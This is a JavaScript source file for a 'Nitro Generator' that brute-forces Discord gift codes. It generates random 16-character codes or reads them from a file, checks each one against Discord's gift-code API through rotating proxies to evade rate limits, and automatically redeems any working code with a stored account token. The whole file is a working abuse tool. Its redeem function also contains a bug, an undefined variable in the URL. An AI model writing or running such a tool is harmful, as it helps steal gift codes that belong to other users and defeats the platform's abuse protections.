const request = require('request');
const chalk = require('chalk');
const fs = require('fs');
const prompt = require('prompt');
var RandExp = require('randexp');
const ProxyAgent = require('proxy-agent');
const codes = fs.readFileSync('CustomCodes.txt', 'utf-8').replace(/\r/gi, '').split('\n');
var proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/gi, '').split('\n');
const config = require("./config.json");

var work = 0;
var invalid = 0;
var failed = 0;
var triesPerSecond = 10000;

process.on('uncaughtException', err => {});
process.on('unhandledRejection', err => {});
process.warn = () => {};

codegen = function() {
    var code = new RandExp(/^([a-zA-Z0-9]{16})$/).gen();
    return code;
}

function write(content, file) {
    fs.appendFile(file, content, function(err) {});
}

function claim(nitro) {
    request({
        url: `https://discordapp.com/api/v6/entitlements/gift-codes/${code}/redeem`,
        method: "POST",
        headers: {
            "Authorization": config.token
        }
    }, function(error, response, body) {
        if (body.includes("This gift has been redeemed already")) {
            console.log(`[INFO] ${new Date().toLocaleTimeString()} Code has already been redeemed`);
        } else if (body.includes("nitro")) {
            console.log(chalk.hex("66ff00")(`[${chalk.white('Success')}] Nitro code claimed`));
        } else if (body.includes("Unknown Gift Code")) {
            console.log(chalk.red(`[INVALID] [${new Date().toLocaleTimeString()}] Code is Invalid `));
        } else {
            console.log(chalk.hex("#FFA500")('[WARN] An error occured'));
        }
    })
}

function check(nitro) {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    var agent = new ProxyAgent(`${config.proxyType}://${proxy}`);
    request({
        method: "GET",
        url: `https://discordapp.com/api/v6/entitlements/gift-codes/${nitro}?with_application=false&with_subscription_plan=true`,
        agent,
        json: true,
        headers: {
            "Content-Type": "application/json",
        }
    }, (err, res, body) => {
        switch (res.statusCode) {
            case 200:
                work++;
                console.log(chalk.green(`[${chalk.white('200')}] Working Nitro | %s |  %s`), nitro, proxy);
                claim(nitro);
                write(nitro + "\n", "Nitros/working.txt");
                break;
            case 404:
                invalid++;
                console.log(chalk.red(`[${chalk.white('401')}] (${invalid}) | ${chalk.white('Invalid Nitro')} | https://discord.gift/%s |  %s`), nitro, proxy);
                write("https://discord.gift/" + nitro + "\n", "Nitros/invalid.txt");
                break
            case 429:
                console.log(chalk.yellow(`[${chalk.white('429')}] | Rate Limited on %s`), proxy);
                failed++;
                check(nitro);
                break;
            default:
                check(nitro);
                break;
        }
        process.title = `[313][Nitro Generator] | Working ${work} | Invalid Nitros ${invalid} | Proxy Error: ${failed} | Total Proxies: ${proxies.length} `;
    });
}

process.title = `[313][Nitro Generator] | Invalid Nitros ${invalid} | Working ${work} | Total Proxies: ${proxies.length} `;
console.log(chalk.hex("d24dff")(`
		▐ ▄ ▪  ▄▄▄▄▄▄▄▄           ▄▄ • ▄▄▄ . ▐ ▄ ▄▄▄ .▄▄▄   ▄▄▄· ▄▄▄▄▄      ▄▄▄  
		•█▌▐███ •██  ▀▄ █· ▄█▀▄   ▐█ ▀ ▪▀▄.▀·•█▌▐█▀▄.▀·▀▄ █·▐█ ▀█ •██   ▄█▀▄ ▀▄ █·
		▐█▐▐▌▐█· ▐█.▪▐▀▀▄ ▐█▌.▐▌  ▄█ ▀█▄▐▀▀▪▄▐█▐▐▌▐▀▀▪▄▐▀▀▄ ▄█▀▀█  ▐█.▪▐█▌.▐▌▐▀▀▄ 
		██▐█▌▐█▌ ▐█▌·▐█•█▌▐█▌.▐▌  ▐█▄▪▐█▐█▄▄▌██▐█▌▐█▄▄▌▐█•█▌▐█ ▪▐▌ ▐█▌·▐█▌.▐▌▐█•█▌
		▀▀ █▪▀▀▀ ▀▀▀ .▀  ▀ ▀█▄▀▪  ·▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀ .▀  ▀ ▀  ▀  ▀▀▀  ▀█▄▀▪.▀  ▀
						${chalk.underline.hex("e6ffff")('Made by Luci')}
`));
console.log("");
console.log("[1] BruteForce Codes");
console.log("[2] Custom Codes from customCodes.txt");
prompt.start();
console.log("");
prompt.get(['options'], function(err, result) {
    console.log('');
    var options = result.options;
    switch (options) {
        case "1":
            console.log(chalk.inverse("Nitro Brute Tool!"));
            console.log("")
            console.log("Starting...");
            check(codegen());
            setInterval(() => {
                check(codegen());
            }, (1 / triesPerSecond) * 10);
            break;
        case "2":

            for (var i in codes) check(codes[i]);
            break;
    }
})